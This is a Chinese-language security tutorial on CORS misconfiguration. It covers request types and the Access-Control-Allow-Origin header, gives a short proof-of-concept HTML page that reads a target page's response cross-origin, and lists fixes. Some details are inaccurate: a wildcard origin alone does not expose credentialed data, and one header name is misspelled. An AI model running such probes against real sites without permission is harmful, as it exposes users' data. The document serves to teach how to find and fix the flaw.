## Cors介绍

Cors全称"跨域资源共享"（Cross-origin resource
sharing），Cors的出现是用来弥补SOP（同源策略）的不足。在当时SOP有些限制了网页的业务需求，不能够使不同域的网页互相访问，因此提出了Cors：用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。

Cors漏洞就是攻击者利用Cors技术来获取用户的敏感数据，从而导致用户敏感信息泄露。

## 漏洞原理

Cors请求可分为两类，简单请求和非简单请求。所谓简单请求，就是请求方式为GET，POST，HEAD这三种之一，并且HTTP头不超出（Accept，Accept-Language，Content-Language，Lat-Event-ID，Content-Type）这几种字段。

当浏览器发现服务器的请求为简单请求时，会在头信息里加入Origin字段。Origin字段代表此次请求来自哪个域，服务器就可以检验是否来自该域。如果匹配，服务器就会在响应里增添三个字段：

  * Access-Control-Allow-Origin
  * Access-Control-Allow-Credentials
  * Access-Control-Expose-Headers

其中 Access-Control-Allow-Origin是必须有的，而剩下两个可有可无。Access-Control-Allow-Origin字段代表允许哪个域访问。当字段值为‘*’时，就代表任意域都可以访问，这样，就导致了Cors漏洞的产生。

## 漏洞复现

随意打开一网站，找到一些用户信息：

![1645930156_621ae6ac60b67af22dc7c.png!small?1645930156711](https://image.3001.net/images/20220227/1645930156_621ae6ac60b67af22dc7c.png!small?1645930156711)

再查看该网页的响应包：

![1645930241_621ae70196639432a0748.png!small?1645930242155](https://image.3001.net/images/20220227/1645930241_621ae70196639432a0748.png!small?1645930242155)

可以看到响应包里面：Access-Control-Allow-Origin:*,这就代表了任意域可以访问，构造poc：

  

    
    
    <!DOCTYPE>
    <html>
    <script type="text/javascript">
    function loadXMLDoc()
    {
        var xhr = new XMLHttpRequest();
    
        xhr.onreadystatechange=function()
        {
            if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response
            {
                var datas=xhr.responseText;
                alert(datas);
            }
        }
        //request vuln page
        xhr.open("GET","http://www.target.com","true") //网页地址
        xhr.send();
    }
    loadXMLDoc();
    </script>
    </html>

最后进行验证：

![1645930470_621ae7e67c34b53370b07.png!small?1645930471013](https://image.3001.net/images/20220227/1645930470_621ae7e67c34b53370b07.png!small?1645930471013)

可以看到成功截取到了用户的信息。

## 漏洞修复

1.不要将Access-Control-Allow-Origin字段设置为*

2.严格校验Origin字段的值

3.HTTPS 网站不要信任HTTP 域

4.不要信任全部自身子域，减少攻击面

